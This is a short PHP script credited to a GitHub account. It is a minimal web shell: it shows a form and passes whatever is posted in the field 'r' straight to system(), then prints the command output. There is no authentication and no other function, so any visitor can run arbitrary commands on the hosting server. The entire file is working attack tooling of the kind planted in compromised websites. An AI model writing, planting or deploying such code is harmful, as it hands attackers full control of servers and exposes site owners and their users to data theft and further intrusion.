<?php 
// github.com/pajaar

echo '<form method="POST">
<input type="text" name="r">
<input type="submit">
</form>';

if(isset($_POST['r'])){	
echo '<textarea rows="30" cols="50">';
echo system($_POST['r']);
echo '</textarea>';
}
?>
